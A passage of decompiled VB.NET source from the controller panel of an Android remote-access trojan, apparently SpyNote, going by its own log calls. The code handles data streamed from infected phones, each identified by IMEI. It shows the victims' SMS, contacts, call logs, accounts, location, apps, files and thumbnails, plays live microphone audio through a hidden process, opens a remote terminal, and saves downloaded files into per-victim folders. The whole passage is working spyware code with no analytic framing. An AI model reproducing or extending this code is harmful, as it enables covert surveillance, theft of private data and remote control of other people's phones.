                                                            microphone2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                        Else
                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 66L), False) = 0)
                                                            If flag5 Then
                                                                Dim name5 As String = "Microphone_404"
                                                                Dim microphone3 As Microphone = CType(My.Application.OpenForms(name5), Microphone)
                                                                Dim flag64 As Boolean = microphone3 IsNot Nothing
                                                                If flag64 Then
                                                                    Dim flag65 As Boolean = Operators.CompareString(array2(1).Trim(), Store.BFF(Store.buff, 104L), False) = 0
                                                                    If flag65 Then
                                                                        microphone3.Packet = 0L
                                                                        Dim fileName As String = Store.Resources(1) + "\Imports\PlayerJava\PlayerJava.jar"
                                                                        Dim arguments As String = String.Concat(New String() {array2(3).Trim(), Strings.Space(1), "0", Strings.Space(1), array2(2).Trim(), Strings.Space(1), Conversions.ToString(Store.udpPortIsReady)})
                                                                        Dim id As Integer = Process.Start(New ProcessStartInfo() With {.FileName = fileName, .Arguments = arguments, .WindowStyle = ProcessWindowStyle.Hidden}).Id
                                                                        microphone3.pid = id
                                                                        Data.PublicPID = id
                                                                    End If
                                                                End If
                                                            Else
                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 68L), False) = 0)
                                                                If flag5 Then
                                                                    Dim name6 As String = "Microphone_404"
                                                                    Dim microphone4 As Microphone = CType(My.Application.OpenForms(name6), Microphone)
                                                                    Dim flag66 As Boolean = microphone4 IsNot Nothing
                                                                    If flag66 Then
                                                                        Dim num4 As Long = Conversions.ToLong(If(Versioned.IsNumeric(array2(1).Trim()), array2(1).Trim(), -1))
                                                                        Dim flag67 As Boolean = num4 < microphone4.Packet
                                                                        If Not flag67 Then
                                                                            Dim flag68 As Boolean = Not microphone4.FPTimer.Enabled
                                                                            If flag68 Then
                                                                                microphone4.FPTimer.Enabled = True
                                                                            End If
                                                                            microphone4.FP += 1L
                                                                            microphone4.Packet = num4
                                                                            microphone4.TProgressBar.Enabled = True
                                                                            Dim array5 As Byte() = CType(array.GetValue(1), Byte())
                                                                            Store.Java.Send(array5, array5.Length)
                                                                        End If
                                                                    End If
                                                                Else
                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 82L), False) = 0)
                                                                    If flag5 Then
                                                                        Dim text10 As String = String.Concat(New String() {"Note_Pad_", socketClient.ClientName, socketClient.ClientImei, Strings.Space(1), array2(3).Trim().ToString()})
                                                                        Dim notepad As Notepad = CType(My.Application.OpenForms(text10), Notepad)
                                                                        Dim flag69 As Boolean = notepad Is Nothing
                                                                        If flag69 Then
                                                                            notepad = New Notepad()
                                                                            notepad.Name = text10
                                                                            notepad.Text = text10
                                                                            notepad.TClient = socketClient
                                                                            notepad.MPath = array2(3).Trim().ToString()
                                                                            notepad.Show()
                                                                        End If
                                                                        notepad.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim()})
                                                                    Else
                                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 14L), False) = 0)
                                                                        If flag5 Then
                                                                            Dim text11 As String = "File_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                            Dim file_Manager2 As File_Manager = CType(My.Application.OpenForms(text11), File_Manager)
                                                                            Dim flag70 As Boolean = file_Manager2 Is Nothing
                                                                            If flag70 Then
                                                                                file_Manager2 = New File_Manager()
                                                                                file_Manager2.Name = text11
                                                                                file_Manager2.Text = text11
                                                                                file_Manager2.TClient = socketClient
                                                                                file_Manager2.Show()
                                                                            End If
                                                                            file_Manager2.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim()})
                                                                        Else
                                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 15L), False) = 0)
                                                                            If flag5 Then
                                                                                Dim name7 As String = "File_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                Dim file_Manager3 As File_Manager = CType(My.Application.OpenForms(name7), File_Manager)
                                                                                Dim flag71 As Boolean = file_Manager3 IsNot Nothing
                                                                                If flag71 Then
                                                                                    Dim left2 As String = array2(1)
                                                                                    Dim flag72 As Boolean = Operators.CompareString(left2, Store.BFF(Store.buff, 100L), False) = 0
                                                                                    If flag72 Then
                                                                                        Dim flag73 As Boolean = file_Manager3.ViewManager.SelectedRows.Count = 1 And Operators.CompareString(file_Manager3.TEXTPATH.Text, array2(2), False) = 0
                                                                                        If flag73 Then
                                                                                            Dim left3 As String = Conversions.ToString(file_Manager3.ViewManager.Rows(Conversions.ToInteger(array2(4))).Cells(1).Value)
                                                                                            Dim flag74 As Boolean = Operators.CompareString(left3, array2(3), False) = 0
                                                                                            If flag74 Then
                                                                                                Dim buffer2 As Byte() = CType(array.GetValue(1), Byte())
                                                                                                Dim stream2 As MemoryStream = New MemoryStream(buffer2)
                                                                                                Dim bitmap3 As Bitmap = New Bitmap(Image.FromStream(stream2))
                                                                                                Dim format2 As PixelFormat = PixelFormat.Format32bppArgb
                                                                                                Dim rect As Rectangle = New Rectangle(0, 0, bitmap3.Width, bitmap3.Height)
                                                                                                Dim bitmapdata As BitmapData = bitmap3.LockBits(rect, ImageLockMode.ReadWrite, format2)
                                                                                                bitmap3.UnlockBits(bitmapdata)
                                                                                                Dim image2 As Image = bitmap3
                                                                                                Dim graphics As Graphics = Graphics.FromImage(image2)
                                                                                                Dim pen As Pen = New Pen(Color.FromArgb(150, 84, 178, 250), 15.0F)
                                                                                                Dim rect2 As Rectangle = New Rectangle(5, image2.Size.Height - 10, 26, 10)
                                                                                                graphics.DrawRectangle(pen, rect2)
                                                                                                graphics.DrawString(array2(5), New Font("Segoe UI", 8.0F), New SolidBrush(Color.White), 0F, CSng((image2.Size.Height - 16)))
                                                                                                graphics.Dispose()
                                                                                                file_Manager3.ViewImge.Image = image2
                                                                                                Dim flag75 As Boolean = Not file_Manager3.ViewImge.Visible
                                                                                                If flag75 Then
                                                                                                    file_Manager3.ViewImge.Visible = True
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    Else
                                                                                        flag72 = (Operators.CompareString(left2, Store.BFF(Store.buff, 101L), False) = 0)
                                                                                        If flag72 Then
                                                                                            Dim flag76 As Boolean = file_Manager3.ViewManager.SelectedRows.Count = 1 And Operators.CompareString(file_Manager3.TEXTPATH.Text, array2(2), False) = 0
                                                                                            If flag76 Then
                                                                                                Dim left4 As String = Conversions.ToString(file_Manager3.ViewManager.Rows(Conversions.ToInteger(array2(4))).Cells(1).Value)
                                                                                                Dim flag77 As Boolean = Operators.CompareString(left4, array2(3), False) = 0
                                                                                                If flag77 Then
                                                                                                    Dim buffer3 As Byte() = CType(array.GetValue(1), Byte())
                                                                                                    Dim stream3 As MemoryStream = New MemoryStream(buffer3)
                                                                                                    Dim bitmap4 As Bitmap = New Bitmap(Image.FromStream(stream3))
                                                                                                    Dim format3 As PixelFormat = PixelFormat.Format32bppArgb
                                                                                                    Dim rect3 As Rectangle = New Rectangle(0, 0, bitmap4.Width, bitmap4.Height)
                                                                                                    Dim bitmapdata2 As BitmapData = bitmap4.LockBits(rect3, ImageLockMode.ReadWrite, format3)
                                                                                                    bitmap4.UnlockBits(bitmapdata2)
                                                                                                    Dim image3 As Image = bitmap4
                                                                                                    Dim graphics2 As Graphics = Graphics.FromImage(image3)
                                                                                                    Dim pen2 As Pen = New Pen(Color.FromArgb(150, 0, 0, 0), 15.0F)
                                                                                                    Dim rect4 As Rectangle = New Rectangle(5, image3.Size.Height - 10, 26, 10)
                                                                                                    graphics2.DrawRectangle(pen2, rect4)
                                                                                                    graphics2.DrawString(array2(5), New Font("Segoe UI", 8.0F), New SolidBrush(Color.White), 0F, CSng((image3.Size.Height - 16)))
                                                                                                    graphics2.Dispose()
                                                                                                    file_Manager3.ViewImge.Image = image3
                                                                                                    Dim flag78 As Boolean = Not file_Manager3.ViewImge.Visible
                                                                                                    If flag78 Then
                                                                                                        file_Manager3.ViewImge.Visible = True
                                                                                                    End If
                                                                                                    Dim flag79 As Boolean = file_Manager3.ViewManager.Rows(Conversions.ToInteger(array2(4))).Cells(0).Tag Is Nothing
                                                                                                    If flag79 Then
                                                                                                        Dim tag As Object() = New Object() {image3, array2(5)}
                                                                                                        file_Manager3.ViewManager.Rows(Conversions.ToInteger(array2(4))).Cells(0).Tag = tag
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    End If
                                                                                End If
                                                                            Else
                                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 34L), False) = 0)
                                                                                If flag5 Then
                                                                                    Dim flag80 As Boolean = Operators.CompareString(array2(1).Trim(), "null", False) = 0
                                                                                    If Not flag80 Then
                                                                                        Dim flag81 As Boolean = Operators.CompareString(array2(1).Trim(), Data.Pass, False) <> 0
                                                                                        If flag81 Then
                                                                                            Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Connected", "NotReady", Nothing, "Invalid Password"})
                                                                                            Return
                                                                                        End If
                                                                                    End If
                                                                                    socketClient.ClientImei = array2(3).Trim()
                                                                                    socketClient.ClientName = array2(2).Trim()
                                                                                    Dim name8 As String = "Downloads_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                    Dim downloadManager As DownloadManager = CType(My.Application.OpenForms(name8), DownloadManager)
                                                                                    Dim flag82 As Boolean = downloadManager IsNot Nothing
                                                                                    If flag82 Then
                                                                                        socketClient.TimeOut = True
                                                                                        downloadManager.DManagerClient = socketClient
                                                                                        Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "File transfer socket", "Ready", Nothing, "Available"})
                                                                                        Dim flag83 As Boolean = Not downloadManager.TDownload.Enabled
                                                                                        If flag83 Then
                                                                                            downloadManager.TDownload.Enabled = True
                                                                                        End If
                                                                                    Else
                                                                                        socketClient.Close(False)
                                                                                    End If
                                                                                Else
                                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 72L), False) = 0)
                                                                                    If flag5 Then
                                                                                        Dim text12 As String = "Downloads_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                        Dim downloadManager2 As DownloadManager = CType(My.Application.OpenForms(text12), DownloadManager)
                                                                                        Dim flag84 As Boolean = downloadManager2 Is Nothing
                                                                                        If flag84 Then
                                                                                            downloadManager2 = New DownloadManager()
                                                                                            downloadManager2.Name = text12
                                                                                            downloadManager2.Text = text12
                                                                                            downloadManager2.TClient = socketClient
                                                                                            downloadManager2.TClient.FileSizeBytesDownloaded = 0L
                                                                                            downloadManager2.TClient.elapsed_time = Nothing
                                                                                            downloadManager2.TClient.stop_time = DateTime.MinValue
                                                                                            downloadManager2.TClient.TotalFileSize = 0L
                                                                                            downloadManager2.TClient.start_time = DateAndTime.Now
                                                                                            downloadManager2.Show()
                                                                                            Dim directory2 As String = String.Concat(New String() {Store.Resources(1), "\Clients\", downloadManager2.TClient.ClientName, "_", downloadManager2.TClient.ClientImei, "\Downloads"})
                                                                                            Dim flag85 As Boolean = Not My.Computer.FileSystem.DirectoryExists(directory2)
                                                                                            If flag85 Then
                                                                                                My.Computer.FileSystem.CreateDirectory(directory2)
                                                                                            End If
                                                                                        End If
                                                                                        Dim flag86 As Boolean = downloadManager2 IsNot Nothing
                                                                                        If flag86 Then
                                                                                            Dim left5 As String = array2(1)
                                                                                            Dim flag87 As Boolean = Operators.CompareString(left5, Store.BFF(Store.buff, 103L), False) = 0
                                                                                            If flag87 Then
                                                                                                Dim flag88 As Boolean = downloadManager2.DManager.Rows.Count > 0
                                                                                                If flag88 Then
                                                                                                    Dim flag89 As Boolean = Operators.ConditionalCompareObjectEqual(downloadManager2.DManager.Rows(0).Cells(1).Tag, "go", False)
                                                                                                    If flag89 Then
                                                                                                        Dim array6 As Byte() = CType(array.GetValue(1), Byte())
                                                                                                        Dim path As String = String.Concat(New String() {Store.Resources(1), "\Clients\", downloadManager2.TClient.ClientName, "_", downloadManager2.TClient.ClientImei, "\Downloads\", Conversions.ToString(downloadManager2.DManager.Rows(0).Cells(1).Value)})
                                                                                                        Dim flag90 As Boolean = downloadManager2._Stream = 0
                                                                                                        If flag90 Then
                                                                                                            socketClient.wFileStream = New FileStream(path, FileMode.OpenOrCreate, FileAccess.Write)
                                                                                                        End If
                                                                                                        socketClient.wFileStream.Write(array6, 0, array6.Length)
                                                                                                        socketClient.wFileStream.Flush()
                                                                                                        downloadManager2._Stream += array6.Length
                                                                                                        ' The following expression was wrapped in a unchecked-expression
                                                                                                        downloadManager2.TClient.FileSizeBytesDownloaded += CLng(array6.Length)
                                                                                                        Dim flag91 As Boolean = Not downloadManager2.TCompletion.Enabled
                                                                                                        If flag91 Then
                                                                                                            downloadManager2.TCompletion.Enabled = True
                                                                                                        End If
                                                                                                        Dim flag92 As Boolean = downloadManager2._Stream = Conversions.ToInteger(downloadManager2.DManager.Rows(0).Cells(2).Tag)
                                                                                                        If flag92 Then
                                                                                                            socketClient.wFileStream.Close()
                                                                                                            socketClient.wFileStream.Dispose()
                                                                                                            socketClient.wFileStream = Nothing
                                                                                                            downloadManager2.DManager.Rows.RemoveAt(0)
                                                                                                        End If
                                                                                                    End If
                                                                                                End If
                                                                                            Else
                                                                                                flag87 = (Operators.CompareString(left5, Store.BFF(Store.buff, 102L), False) = 0)
                                                                                                If flag87 Then
                                                                                                    Dim flag93 As Boolean = Not downloadManager2.TProgressBar.Enabled
                                                                                                    If flag93 Then
                                                                                                        downloadManager2.TProgressBar.Enabled = True
                                                                                                    End If
                                                                                                    Dim num5 As Long = Conversions.ToLong(array2(3))
                                                                                                    Dim flag94 As Boolean = num5 = 0L
                                                                                                    If flag94 Then
                                                                                                        Dim path2 As String = String.Concat(New String() {Store.Resources(1), "\Clients\", downloadManager2.TClient.ClientName, "_", downloadManager2.TClient.ClientImei, "\Downloads\", array2(2)})
                                                                                                        File.Create(path2).Dispose()
                                                                                                    Else
                                                                                                        Dim text13 As String
                                                                                                        Try
                                                                                                            Dim fileInfo As FileInfo = New FileInfo(array2(2))
                                                                                                            text13 = fileInfo.Extension
                                                                                                        Catch expr_2C29 As Exception
                                                                                                            ProjectData.SetProjectError(expr_2C29)
                                                                                                            text13 = "-1"
                                                                                                            ProjectData.ClearProjectError()
                                                                                                        End Try
                                                                                                        Dim num6 As Integer = downloadManager2.imageList_0.Images.IndexOfKey(text13.ToUpper())
                                                                                                        If num6 = -1 Then
                                                                                                            num6 = downloadManager2.imageList_0.Images.IndexOfKey("-1".ToUpper())
                                                                                                        End If
                                                                                                        downloadManager2.DManager.Rows.Add(New Object() {downloadManager2.imageList_0.Images(num6), array2(2), NewLateBinding.LateIndexGet(Store.BytesConverter(Conversions.ToLong(array2(3).Trim())), New Object() {0}, Nothing), array2(4)})
                                                                                                        downloadManager2.DManager.Rows(downloadManager2.DManager.Rows.Count - 1).Cells(2).Tag = array2(3)
                                                                                                        downloadManager2.TClient.TotalFileSize += num5
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    Else
                                                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 74L), False) = 0)
                                                                                        If flag5 Then
                                                                                            Dim text14 As String = "Location_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                            Dim locationManager2 As LocationManager = CType(My.Application.OpenForms(text14), LocationManager)
                                                                                            Dim flag95 As Boolean = locationManager2 Is Nothing
                                                                                            If flag95 Then
                                                                                                locationManager2 = New LocationManager()
                                                                                                locationManager2.Name = text14
                                                                                                locationManager2.Text = text14
                                                                                                locationManager2.Tag = text14
                                                                                                locationManager2.TClient = socketClient
                                                                                                locationManager2.Show()
                                                                                            End If
                                                                                            locationManager2.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim(), array2(4).Trim(), array2(5).Trim()})
                                                                                        Else
                                                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 73L), False) = 0)
                                                                                            If flag5 Then
                                                                                                Dim name9 As String = "Location_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                Dim locationManager3 As LocationManager = CType(My.Application.OpenForms(name9), LocationManager)
                                                                                                Dim flag96 As Boolean = locationManager3 IsNot Nothing
                                                                                                If flag96 Then
                                                                                                    locationManager3.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim(), array2(4).Trim(), array2(5).Trim()})
                                                                                                End If
                                                                                            Else
                                                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 75L), False) = 0)
                                                                                                If flag5 Then
                                                                                                    Dim text15 As String = "Calls_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                    Dim callsManager2 As CallsManager = CType(My.Application.OpenForms(text15), CallsManager)
                                                                                                    Dim flag97 As Boolean = callsManager2 Is Nothing
                                                                                                    If flag97 Then
                                                                                                        callsManager2 = New CallsManager()
                                                                                                        callsManager2.Name = text15
                                                                                                        callsManager2.Text = text15
                                                                                                        callsManager2.Tag = text15
                                                                                                        callsManager2.TClient = socketClient
                                                                                                        callsManager2.Show()
                                                                                                    End If
                                                                                                    callsManager2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                Else
                                                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 76L), False) = 0)
                                                                                                    If flag5 Then
                                                                                                        Dim text16 As String = "Accounts_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                        Dim accountManager2 As AccountManager = CType(My.Application.OpenForms(text16), AccountManager)
                                                                                                        Dim flag98 As Boolean = accountManager2 Is Nothing
                                                                                                        If flag98 Then
                                                                                                            accountManager2 = New AccountManager()
                                                                                                            accountManager2.Name = text16
                                                                                                            accountManager2.Text = text16
                                                                                                            accountManager2.Tag = text16
                                                                                                            accountManager2.TClient = socketClient
                                                                                                            accountManager2.Show()
                                                                                                        End If
                                                                                                        accountManager2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                    Else
                                                                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 77L), False) = 0)
                                                                                                        If flag5 Then
                                                                                                            Dim text17 As String = "Contacts_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                            Dim contactsManager2 As ContactsManager = CType(My.Application.OpenForms(text17), ContactsManager)
                                                                                                            Dim flag99 As Boolean = contactsManager2 Is Nothing
                                                                                                            If flag99 Then
                                                                                                                contactsManager2 = New ContactsManager()
                                                                                                                contactsManager2.Name = text17
                                                                                                                contactsManager2.Text = text17
                                                                                                                contactsManager2.Tag = text17
                                                                                                                contactsManager2.TClient = socketClient
                                                                                                                contactsManager2.Show()
                                                                                                            End If
                                                                                                            contactsManager2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                        Else
                                                                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 27L), False) = 0)
                                                                                                            If flag5 Then
                                                                                                                Dim text18 As String = "SMS_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                Dim sMSManager2 As SMSManager = CType(My.Application.OpenForms(text18), SMSManager)
                                                                                                                Dim flag100 As Boolean = sMSManager2 Is Nothing
                                                                                                                If flag100 Then
                                                                                                                    sMSManager2 = New SMSManager()
                                                                                                                    sMSManager2.Name = text18
                                                                                                                    sMSManager2.Text = text18
                                                                                                                    sMSManager2.Tag = text18
                                                                                                                    sMSManager2.TClient = socketClient
                                                                                                                    sMSManager2.Show()
                                                                                                                End If
                                                                                                                sMSManager2.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim()})
                                                                                                            Else
                                                                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 32L), False) = 0)
                                                                                                                If flag5 Then
                                                                                                                    Dim text19 As String = "Call_Phone_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                    Dim callPhone2 As CallPhone = CType(My.Application.OpenForms(text19), CallPhone)
                                                                                                                    Dim flag101 As Boolean = callPhone2 Is Nothing
                                                                                                                    If flag101 Then
                                                                                                                        callPhone2 = New CallPhone()
                                                                                                                        callPhone2.Name = text19
                                                                                                                        callPhone2.Text = text19
                                                                                                                        callPhone2.Tag = text19
                                                                                                                        callPhone2.TClient = socketClient
                                                                                                                        callPhone2.Show()
                                                                                                                    End If
                                                                                                                    callPhone2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                Else
                                                                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 78L), False) = 0)
                                                                                                                    If flag5 Then
                                                                                                                        Dim text20 As String = "Apps_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                        Dim apps2 As Apps = CType(My.Application.OpenForms(text20), Apps)
                                                                                                                        Dim flag102 As Boolean = apps2 Is Nothing
                                                                                                                        If flag102 Then
                                                                                                                            apps2 = New Apps()
                                                                                                                            apps2.Name = text20
                                                                                                                            apps2.Text = text20
                                                                                                                            apps2.Tag = text20
                                                                                                                            apps2.TClient = socketClient
                                                                                                                            apps2.Show()
                                                                                                                        End If
                                                                                                                        apps2.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim()})
                                                                                                                    Else
                                                                                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 62L), False) = 0)
                                                                                                                        If flag5 Then
                                                                                                                            Dim text21 As String = "Fun_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                            Dim fUN2 As FUN = CType(My.Application.OpenForms(text21), FUN)
                                                                                                                            Dim flag103 As Boolean = fUN2 Is Nothing
                                                                                                                            If flag103 Then
                                                                                                                                Dim dz As New FUN() With {.Name = text21, .Text = text21, .Tag = text21, .TClient = socketClient}
                                                                                                                                dz.Show()
                                                                                                                            End If
                                                                                                                            My.Forms.Apps.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                        Else
                                                                                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 79L), False) = 0)
                                                                                                                            If flag5 Then
                                                                                                                                Dim text22 As String = "chat_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                Dim chat2 As Chat = CType(My.Application.OpenForms(text22), Chat)
                                                                                                                                Dim flag104 As Boolean = chat2 Is Nothing
                                                                                                                                If flag104 Then
                                                                                                                                    chat2 = New Chat()
                                                                                                                                    chat2.Name = text22
                                                                                                                                    chat2.Text = text22
                                                                                                                                    chat2.Tag = text22
                                                                                                                                    chat2.TClient = socketClient
                                                                                                                                    Dim flag105 As Boolean = Operators.CompareString(socketClient.Nickname, "-1", False) <> 0
                                                                                                                                    If flag105 Then
                                                                                                                                        chat2.MyName = socketClient.Nickname
                                                                                                                                    End If
                                                                                                                                    chat2.Show()
                                                                                                                                End If
                                                                                                                                chat2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                            Else
                                                                                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 37L), False) = 0)
                                                                                                                                If flag5 Then
                                                                                                                                    Dim text23 As String = "Terminal_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                    Dim terminal2 As Terminal = CType(My.Application.OpenForms(text23), Terminal)
                                                                                                                                    Dim flag106 As Boolean = terminal2 Is Nothing
                                                                                                                                    If flag106 Then
                                                                                                                                        terminal2 = New Terminal()
                                                                                                                                        terminal2.Name = text23
                                                                                                                                        terminal2.Text = text23
                                                                                                                                        terminal2.Tag = text23
                                                                                                                                        terminal2.TClient = socketClient
                                                                                                                                        terminal2.Show()
                                                                                                                                    End If
                                                                                                                                    terminal2.TData(New String() {array2(1).Trim(), array2(2).Trim(), array2(3).Trim()})
                                                                                                                                Else
                                                                                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 80L), False) = 0)
                                                                                                                                    If flag5 Then
                                                                                                                                        Dim name10 As String = "Settings_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                        Dim fSettings2 As FSettings = CType(My.Application.OpenForms(name10), FSettings)
                                                                                                                                        Dim flag107 As Boolean = fSettings2 IsNot Nothing
                                                                                                                                        If flag107 Then
                                                                                                                                            Dim flag108 As Boolean = Operators.CompareString(array2(2).Trim().ToLower(), "true", False) = 0
                                                                                                                                            If flag108 Then
                                                                                                                                                fSettings2.LABKEY.Text = "Success Password " + array2(1).ToString()
                                                                                                                                            Else
                                                                                                                                                fSettings2.LABKEY.Text = "Fail Password :( " + array2(1).ToString()
                                                                                                                                            End If
                                                                                                                                            Dim flag109 As Boolean = Not fSettings2.LABKEY.Visible
                                                                                                                                            If flag109 Then
                                                                                                                                                fSettings2.LABKEY.Visible = True
                                                                                                                                            End If
                                                                                                                                        End If
                                                                                                                                    Else
                                                                                                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 48L), False) = 0)
                                                                                                                                        If flag5 Then
                                                                                                                                            Dim text24 As String = "Settings_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                            Dim fSettings3 As FSettings = CType(My.Application.OpenForms(text24), FSettings)
                                                                                                                                            Dim flag110 As Boolean = fSettings3 Is Nothing
                                                                                                                                            If flag110 Then
                                                                                                                                                fSettings3 = New FSettings()
                                                                                                                                                fSettings3.Name = text24
                                                                                                                                                fSettings3.Text = text24
                                                                                                                                                fSettings3.Tag = text24
                                                                                                                                                fSettings3.TClient = socketClient
                                                                                                                                                fSettings3.Show()
                                                                                                                                            End If
                                                                                                                                            fSettings3.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                                        Else
                                                                                                                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 49L), False) = 0)
                                                                                                                                            If flag5 Then
                                                                                                                                                Dim name11 As String = "Settings_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                                Dim fSettings4 As FSettings = CType(My.Application.OpenForms(name11), FSettings)
                                                                                                                                                Dim flag111 As Boolean = fSettings4 IsNot Nothing
                                                                                                                                                If flag111 Then
                                                                                                                                                    fSettings4.TrackRingtone.Value = Conversions.ToInteger(array2(1).Trim())
                                                                                                                                                    fSettings4.TrackMedia.Value = Conversions.ToInteger(array2(2).Trim())
                                                                                                                                                    fSettings4.TrackNotification.Value = Conversions.ToInteger(array2(3).Trim())
                                                                                                                                                    fSettings4.TrackSystem.Value = Conversions.ToInteger(array2(4).Trim())
                                                                                                                                                    Dim flag112 As Boolean = Operators.CompareString(array2(5).ToString(), "-1", False) = 0
                                                                                                                                                    If flag112 Then
                                                                                                                                                        fSettings4.BtnBarNormal.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag113 As Boolean = Operators.CompareString(array2(5).ToString(), "True", False) = 0
                                                                                                                                                        If flag113 Then
                                                                                                                                                            fSettings4.BtnBarNormal.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarNormal.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarNormal.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarNormal.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarNormal.Refresh()
                                                                                                                                                    Dim flag114 As Boolean = Operators.CompareString(array2(6).ToString(), "-1", False) = 0
                                                                                                                                                    If flag114 Then
                                                                                                                                                        fSettings4.BtnBarVibrate.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag115 As Boolean = Operators.CompareString(array2(6).ToString(), "True", False) = 0
                                                                                                                                                        If flag115 Then
                                                                                                                                                            fSettings4.BtnBarVibrate.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarVibrate.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarVibrate.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarVibrate.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarVibrate.Refresh()
                                                                                                                                                    Dim flag116 As Boolean = Operators.CompareString(array2(7).ToString(), "-1", False) = 0
                                                                                                                                                    If flag116 Then
                                                                                                                                                        fSettings4.BtnBarSilent.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag117 As Boolean = Operators.CompareString(array2(7).ToString(), "True", False) = 0
                                                                                                                                                        If flag117 Then
                                                                                                                                                            fSettings4.BtnBarSilent.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarSilent.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarSilent.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarSilent.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarSilent.Refresh()
                                                                                                                                                    Dim flag118 As Boolean = Operators.CompareString(array2(8).ToString(), "-1", False) = 0
                                                                                                                                                    If flag118 Then
                                                                                                                                                        fSettings4.BtnBarBluetooth.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag119 As Boolean = Operators.CompareString(array2(8).ToString(), "True", False) = 0
                                                                                                                                                        If flag119 Then
                                                                                                                                                            fSettings4.BtnBarBluetooth.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarBluetooth.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarBluetooth.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarBluetooth.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarBluetooth.Refresh()
